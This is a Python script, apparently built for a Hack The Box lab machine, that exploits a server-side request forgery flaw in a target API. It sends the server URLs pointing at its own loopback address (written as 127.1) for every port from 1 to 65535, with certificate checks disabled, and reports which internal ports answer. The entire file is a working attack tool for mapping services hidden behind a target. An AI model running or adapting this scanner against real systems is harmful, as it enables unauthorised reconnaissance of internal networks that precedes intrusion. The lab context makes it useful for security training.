import argparse
import sys
import threading
import time
import requests
import urllib3

# Suppress insecure request warnings (-k equivalent)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up command-line argument parsing for the timeout option
parser = argparse.ArgumentParser(
    description="API-based Port Scanner with Enter-key status updates."
)
parser.add_argument(
    "-t",
    "--timeout",
    type=float,
    default=2.0,
    help="Request timeout in seconds (default: 2.0)",
)
args = parser.parse_args()

# Ask the user to enter their own API endpoint
try:
  api_url = input(
      "Enter the target API endpoint (e.g., https://cohort.htb/api/validate): "
  ).strip()
  if not api_url:
    print("[-] Error: API endpoint cannot be empty.")
    sys.exit(1)
except KeyboardInterrupt:
  print("\n[-] Exiting gracefully...")
  sys.exit(0)

headers = {"Content-Type": "application/json"}
start_port = 1
end_port = 65535
total_ports = (end_port - start_port) + 1

# Shared variables for tracking progress
current_port = start_port
lock = threading.Lock()
scanning_done = False


def monitor_progress():
  """Listens for the Enter keypress to print the current percentage."""
  global current_port, scanning_done
  while not scanning_done:
    try:
      input()
    except (EOFError, KeyboardInterrupt):
      break
    with lock:
      if scanning_done:
        break
      ports_scanned = (current_port - start_port) + 1
      percent = (ports_scanned / total_ports) * 100
      print(
          f"\n[*] Status: {percent:.2f}% done"
          f" ({ports_scanned}/{total_ports} ports scanned)",
          flush=True,
      )


# Start the background thread for monitoring
monitor_thread = threading.Thread(target=monitor_progress, daemon=True)
monitor_thread.start()

print(f"\n[*] Starting port scan using endpoint: {api_url}")
print(f"[*] Timeout set to {args.timeout} seconds.")
print(
    f"[*] Scanning ports {start_port} to {end_port}..."
    " (Press [Enter] for progress, [Ctrl+C] to exit)\n"
)

start_time = time.time()

try:
  for port in range(start_port, end_port + 1):
    with lock:
      current_port = port

    target_url = f"http://127.1:{port}/"
    payload = {"url": target_url, "format": "csv"}

    try:
      response = requests.post(
          api_url,
          json=payload,
          headers=headers,
          verify=False,
          timeout=args.timeout,
      )

      if response.status_code == 200:
        print(
            f"[+] Port {port} responded (200 OK): {response.text[:100]}",
            flush=True,
        )

    except requests.exceptions.RequestException:
      pass

except KeyboardInterrupt:
  print("\n\n[!] Scan interrupted by user (Ctrl+C). Exiting gracefully...")

finally:
  # Mark scanning as complete to close threads cleanly
  with lock:
    scanning_done = True

  elapsed_time = time.time() - start_time
  print(f"\n[+] Script finished in {elapsed_time:.2f} seconds.", flush=True)
  sys.exit(0)
